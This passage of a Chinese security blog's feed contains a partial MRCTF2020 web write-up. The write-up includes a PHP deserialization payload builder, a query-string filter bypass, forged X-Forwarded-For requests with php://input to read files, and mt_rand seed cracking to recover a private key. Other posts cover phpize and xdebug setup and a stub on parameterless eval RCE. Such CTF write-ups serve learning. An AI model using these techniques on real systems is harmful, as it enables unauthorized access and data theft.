class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> Modifier();</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> Test();</span><br><span class="line">$b-&gt;p = $a;</span><br><span class="line"></span><br><span class="line">$c = <span class="keyword">new</span> Show();</span><br><span class="line">$c-&gt;str = $b;</span><br><span class="line"></span><br><span class="line">$d = <span class="keyword">new</span> Show();</span><br><span class="line">$d-&gt;source = $c;</span><br><span class="line">$e = serialize($d);</span><br><span class="line">print_r(urlencode($e));</span><br></pre></td></tr></table></figure><h2 id="套娃"><a href="#套娃" class="headerlink" title="套娃"></a>套娃</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line">$query = $_SERVER[<span class="string">'QUERY_STRING'</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( substr_count($query, <span class="string">'_'</span>) !== <span class="number">0</span> || substr_count($query, <span class="string">'%5f'</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Y0u are So cutE!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>($_GET[<span class="string">'b_u_p_t'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, $_GET[<span class="string">'b_u_p_t'</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are going to the next ~"</span>;</span><br><span class="line">&#125;</span><br><span class="line">!--&gt;</span><br></pre></td></tr></table></figure><p>发包</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?b+u+p+t=23333%0a</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 932aa4a2-952c-4cfc-acf6-7b108c542156.merak-ctf.site</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br></pre></td></tr></table></figure><p>然后是</p><p>jsfuck弹窗</p><p>post me Mera后，得到<code>secrettw.php</code>源码</p><p><code>secrettw.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'takeip.php'</span>;</span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>,<span class="string">'.'</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'Merak'</span>]))&#123; </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span><span class="params">($v)</span></span>&#123; </span><br><span class="line">    $v = base64_decode($v); </span><br><span class="line">    $re = <span class="string">''</span>; </span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) + $i*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> $re; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Local access only!'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">if</span>($ip!=<span class="string">'127.0.0.1'</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Sorry,you don't have permission!  Your ip is :"</span>.$ip;</span><br><span class="line"><span class="keyword">if</span>($ip === <span class="string">'127.0.0.1'</span> &amp;&amp; file_get_contents($_GET[<span class="string">'2333'</span>]) === <span class="string">'todat is a happy day'</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Your REQUEST is:"</span>.change($_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(change($_GET[<span class="string">'file'</span>])); &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>写个unchange函数，因为读取数据的时候，会使用change函数，这样我们不能正常读取数据</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">unchange</span><span class="params">($v)</span></span>&#123;</span><br><span class="line">    $re = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($v);$i++)&#123;</span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*<span class="number">2</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($re);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发包即可</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/secrettw.php?2333=php://input&amp;file=ZmpdYSZmXGI=</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 932aa4a2-952c-4cfc-acf6-7b108c542156.merak-ctf.site</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 20</span><br><span class="line"><span class="attribute">Referer</span>: localhost</span><br><span class="line"><span class="attribute">X-Forwarded-For</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">Client-Ip</span>: 127.0.0.1</span><br><span class="line"></span><br><span class="line">todat is a happy day</span><br></pre></td></tr></table></figure><h2 id="Ezaudit"><a href="#Ezaudit" class="headerlink" title="Ezaudit"></a>Ezaudit</h2><p>网站存在<code>www.zip</code>备份文件</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">header(<span class="string">'Content-type:text/html; charset=utf-8'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))&#123;</span><br><span class="line">    $username = $_POST[<span class="string">'username'</span>];</span><br><span class="line">    $password = $_POST[<span class="string">'password'</span>];</span><br><span class="line">    $Private_key = $_POST[<span class="string">'Private_key'</span>];</span><br><span class="line">    <span class="keyword">if</span> (($username == <span class="string">''</span>) || ($password == <span class="string">''</span>) ||($Private_key == <span class="string">''</span>)) &#123;</span><br><span class="line">        <span class="comment">// 若为空,视为未填写,提示错误,并3秒后返回登录界面</span></span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"用户名、密码、密钥不能为空啦,crispr会让你在2秒后跳转到登录界面的!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>($Private_key != <span class="string">'*************'</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        header(<span class="string">'refresh:2; url=login.html'</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"假密钥，咋会让你登录?crispr会让你在2秒后跳转到登录界面的!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($Private_key === <span class="string">'************'</span>)&#123;</span><br><span class="line">        $getuser = <span class="string">"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'"</span>.<span class="string">';'</span>; </span><br><span class="line">        $link=mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"root"</span>);</span><br><span class="line">        mysql_select_db(<span class="string">"test"</span>,$link);</span><br><span class="line">        $result = mysql_query($getuser);</span><br><span class="line">        <span class="keyword">while</span>($row=mysql_fetch_assoc($result))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;tr&gt;&lt;td&gt;"</span>.$row[<span class="string">"username"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>.$row[<span class="string">"flag"</span>].<span class="string">"&lt;/td&gt;&lt;td&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="comment">// genarate public_key </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//genarate private_key</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">    $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">  &#125;</span><br><span class="line">  $Public_key = public_key();</span><br><span class="line">  <span class="comment">//$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???</span></span><br></pre></td></tr></table></figure><p>这里要得到<code>private_key</code>，很明显，我们要爆破得到种子，运行下面的代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line"></span><br><span class="line">$public_key = <span class="string">'KVQP0LdJKRaV3n9D'</span>;</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($public_key);$i++)&#123;</span><br><span class="line">    $pos =  strpos($strings1,$public_key[$i]);</span><br><span class="line">    <span class="keyword">echo</span> $pos.<span class="string">" "</span>.$pos.<span class="string">" "</span>.<span class="string">"0 "</span>.(strlen($strings1)<span class="number">-1</span>).<span class="string">" "</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得到指定格式后，我们去爆破种子</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">time ./php_mt_seed 36 36 0 61 47 47 0 61 42 42 0 61 41 41 0 61 52 52 0 61 37 37 0 61 3 3 0 61 35 35 0 61 36 36 0 61 43 43 0 61 0 0 0 61 47 47 0 61 55 55 0 61 13 13 0 61 61 61 0 61 29 29 0 61</span><br></pre></td></tr></table></figure><p>得到种子为<code>1775196155</code></p><p>exp.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">mt_srand(<span class="number">1775196155</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// genarate public_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">public_key</span><span class="params">($length = <span class="number">16</span>)</span> </span>&#123;</span><br><span class="line">    $strings1 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $public_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $public_key .= substr($strings1, mt_rand(<span class="number">0</span>, strlen($strings1) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $public_key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//genarate private_key</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">private_key</span><span class="params">($length = <span class="number">12</span>)</span> </span>&#123;</span><br><span class="line">    $strings2 = <span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'</span>;</span><br><span class="line">    $private_key = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $length; $i++ )</span><br><span class="line">        $private_key .= substr($strings2, mt_rand(<span class="number">0</span>, strlen($strings2) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> $private_key;</span><br><span class="line">&#125;</span><br><span class="line">public_key();</span><br><span class="line"><span class="comment">//echo $Public_key;</span></span><br><span class="line"><span class="keyword">echo</span> private_key();</span><br></pre></td></tr></table></figure><p>至于这里为什么要先调用<code>public_key()</code>，因为源码里调用了<code>public_key()</code>，这就意味着伪随机数的前16位是<code>public_key</code>，后12位才是<code>private_key</code></p><p>就做了这么多，剩下的两题有点难，会继续努力（逃～</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;MRCTF2020_web(部分)&lt;/p&gt;
    
    </summary>
    
      <category term="CTF" scheme="http://0clickjacking0.github.io/categories/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>mac下使用phpize安装php扩展</title>
    <link href="http://0clickjacking0.github.io/2020/03/04/mac%E4%B8%8B%E4%BD%BF%E7%94%A8phpize%E5%AE%89%E8%A3%85php%E6%89%A9%E5%B1%95/"/>
    <id>http://0clickjacking0.github.io/2020/03/04/mac下使用phpize安装php扩展/</id>
    <published>2020-03-03T16:13:03.000Z</published>
    <updated>2020-08-24T02:37:17.722Z</updated>
    
    <content type="html"><![CDATA[<p>mac下使用phpize安装php扩展</p><a id="more"></a><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在PHP第一次编译的时候没有选择编译这个库，但是到后来又要用，pecl中又找不到对应的包，这时候我们只能编译源码来安装了</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>首先我们找到自己对应php版本的源码，<a href="https://www.php.net/releases/" target="_blank" rel="noopener">传送门</a></p><p>下载完成之后解压</p><p>这里我以5.6.40为例，进入到你想要安装库的目录，这里为以安装gd库来说明</p><p><img src="http://images.xianyu123.club/php_ext1.png" alt></p><p>gd扩展主要依赖zlib，freetype，libpng，libjpeg这4个库</p><p>所以我们先进行安装</p><p>依次执行命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">brew install zlib</span><br><span class="line">brew install freetype</span><br><span class="line">brew install libpng</span><br><span class="line">brew install libjpeg</span><br></pre></td></tr></table></figure><p>进入到对应的文件夹后，输入phpize，成功的话会显示对应的信息</p><p><img src="http://images.xianyu123.club/php_ext2.png" alt></p><p>执行即可，这里的二进制文件路径不一定跟我的一样，要写对路径，会出错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure --with-php-config=/Users/xianyu123/.phpbrew/php/php-5.6.40/bin/php-config --with-jpeg-dir=/usr/local/opt/libjpeg --with-png-dir=/usr/local/opt/libpng --with-freetype-dir=/usr/local/opt/freetype --with-zlib-dir=/usr/local/opt/zlib</span><br></pre></td></tr></table></figure><p>其中–with-php-config是指向安装php后生成的一个配置工具,主要用于扩展的编译配置</p><p>其他的参数对应指向先前安装依赖的位置</p><p>然后执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make &amp;&amp; make install</span><br></pre></td></tr></table></figure><p>然后就会在自己的php扩展中出现<code>gd.so</code>，这说明我们安装成功了</p><p><img src="http://images.xianyu123.club/php_ext6.png" alt></p><p>我们只需要在php.ini中加入一行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extension=gd.so</span><br></pre></td></tr></table></figure><p>然后重启php-fpm即可完成</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;mac下使用phpize安装php扩展&lt;/p&gt;
    
    </summary>
    
      <category term="PHP" scheme="http://0clickjacking0.github.io/categories/PHP/"/>
    
    
  </entry>
  
  <entry>
    <title>php无参数RCE小结</title>
    <link href="http://0clickjacking0.github.io/2020/02/12/php%E6%97%A0%E5%8F%82%E6%95%B0RCE%E5%B0%8F%E7%BB%93/"/>
    <id>http://0clickjacking0.github.io/2020/02/12/php无参数RCE小结/</id>
    <published>2020-02-12T13:38:18.000Z</published>
    <updated>2020-09-07T08:05:19.826Z</updated>
    
    <content type="html"><![CDATA[<p>php无参数RCE小结</p><a id="more"></a><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近的挺多比赛都遇到了php无参数RCE的题目，这里就直接上题目来讲解一下</p><h1 id="CTF中的题目"><a href="#CTF中的题目" class="headerlink" title="CTF中的题目"></a>CTF中的题目</h1><h2 id="题目1"><a href="#题目1" class="headerlink" title="题目1"></a>题目1</h2><p>来自Code Breaking的phplimit</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">';'</span> === preg_replace(<span class="string">'/[^\W]+\((?R)?\)/'</span>, <span class="string">''</span>, $_GET[<span class="string">'code'</span>])) &#123;    </span><br><span class="line">    <span class="keyword">eval</span>($_GET[<span class="string">'code'</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是让我们构造传入的code不带参数（空参），然后分号结尾的恶意代码</p><h3 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h3><h3 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h3><h3 id="方法3"><a href="#方法3" class="headerlink" title="方法3"></a>方法3</h3><h2 id="题目2"><a href="#题目2" class="headerlink" title="题目2"></a>题目2</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$functions = get_defined_functions();</span><br><span class="line"><span class="comment">//print_r($functions);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($functions[<span class="string">'internal'</span>] <span class="keyword">as</span> $function_name)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/^[a-zA-Z]+$/'</span>,$function_name,$match))</span><br><span class="line">            <span class="keyword">echo</span> $match[<span class="number">0</span>].PHP_EOL;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">catch</span> (<span class="keyword">Exception</span> $e)&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>## </p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;php无参数RCE小结&lt;/p&gt;
    
    </summary>
    
      <category term="Web Security" scheme="http://0clickjacking0.github.io/categories/Web-Security/"/>
    
    
  </entry>
  
  <entry>
    <title>mac+phpstorm+php5.6+chrome+xdebug配置</title>
    <link href="http://0clickjacking0.github.io/2020/02/11/mac-phpstorm-php5-6-xdebug%E9%85%8D%E7%BD%AE/"/>
    <id>http://0clickjacking0.github.io/2020/02/11/mac-phpstorm-php5-6-xdebug配置/</id>
    <published>2020-02-11T02:52:31.000Z</published>
    <updated>2020-08-24T02:37:29.547Z</updated>
    
    <content type="html"><![CDATA[<p>mac+phpstorm+php5.6+chrome+xdebug配置</p><a id="more"></a><h2 id="0-环境说明"><a href="#0-环境说明" class="headerlink" title="0. 环境说明"></a>0. 环境说明</h2><p>macos15.2</p><p>php5.6</p><p>Phpstorm2018.2</p><p>nginx1.17</p><h2 id="1-安装xdebug"><a href="#1-安装xdebug" class="headerlink" title="1. 安装xdebug"></a>1. 安装xdebug</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pecl install xdebug-2.5.5</span><br></pre></td></tr></table></figure><h2 id="2-配置php-ini"><a href="#2-配置php-ini" class="headerlink" title="2. 配置php.ini"></a>2. 配置php.ini</h2><p>安装完成<code>xdebug</code>后会有提示语句</p><p><img src="http://images.xianyu123.club/xdebug2.png" alt></p><p>根据提示我们把下面这句话复制到<code>php.ini</code>中，因为我用的是phpbrew，所以路径可能有点不一样，大家根据自己实际<code>php.ini</code>的位置进行配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zend_extension=/Users/xianyu123/.phpbrew/php/php-5.6.40/lib/php/extensions/no-debug-non-zts-20131226/xdebug.so</span><br></pre></td></tr></table></figure><p>然后我们重启一下<code>php-fpm</code>，然后创建一个文件，内容如下，在网页端打开</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br></pre></td></tr></table></figure><p>如果出现如下，则说明php端已经配置成功了</p><p><img src="http://images.xianyu123.club/xdebug1.png" alt></p><h2 id="3-配置phpstorm调试功能"><a href="#3-配置phpstorm调试功能" class="headerlink" title="3. 配置phpstorm调试功能"></a>3. 配置phpstorm调试功能</h2><p>先把下面的配置添加到<code>php.ini</code>中，然后重启php-fpm</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xdebug.remote_enable = 1</span><br><span class="line">xdebug.remote_handler = dbgp</span><br><span class="line">xdebug.remote_host = 127.0.0.1</span><br><span class="line">xdebug.remote_port = 9001</span><br><span class="line">xdebug.idekey = PHPSTORM</span><br></pre></td></tr></table></figure><p>然后在phpstorm的菜单栏<code>Preferences</code>中找到<code>Debug</code>，填写端口为<code>9001</code></p><p><img src="http://images.xianyu123.club/xdebug3.png" alt></p><p>然后填写</p><p>IDE key：刚才写入<code>php.ini)</code>中</p><p>host：127.0.0.1</p><p>port：项目运行端口，我是用82端口搭建的，有些师傅可能是80</p><p><img src="http://images.xianyu123.club/xdebug4.png" alt></p><p>然后在servers中配置信息</p><p>Name：随便取</p><p>Host：127.0.0.1</p><p>Port：按照你的项目运行端口</p><p>Debugger：按照下图的</p><p><img src="http://images.xianyu123.club/20200522195638.png" alt="image-20200211155643870"></p><h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>打好断点，然后点击这个绿色的小虫子</p><p><img src="http://images.xianyu123.club/xdebug5.png" alt></p><p>按这个一步一步调试</p><p><img src="http://images.xianyu123.club/xdebug6.png" alt></p><p>出现这样说明配置成功了</p><p><img src="http://images.xianyu123.club/xdebug7.png" alt></p><h2 id="4-chrome调试配置"><a href="#4-chrome调试配置" class="headerlink" title="4. chrome调试配置"></a>4. chrome调试配置</h2><p>先下载扩展</p><p>右键扩展选项，在IDE key中选择phpstorm，然后保存，这里名字不能被修改，只能用<code>PHPSTORM</code></p><p><img src="http://images.xianyu123.club/xdebug8.png" alt></p><p>然后在网页打开php，选择debug</p><p><img src="http://images.xianyu123.club/xdebug9.png" alt></p><p>并且在phpstorm中开启这个电话按钮，变成绿色</p><p><img src="http://images.xianyu123.club/xdebug11.png" alt></p><p>然后在phpstorm中就有弹窗，选择同意，这样就可以快乐的调试了</p><p><img src="http://images.xianyu123.club/xdebug10.png" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;mac+phpstorm+php5.6+chrome+xdebug配置&lt;/p&gt;
    
    </summary>
    
      <category term="PHP" scheme="http://0clickjacking0.github.io/categories/PHP/"/>
    
    
  </entry>
  
  <entry>
    <title>BJDCTF2020复现</title>
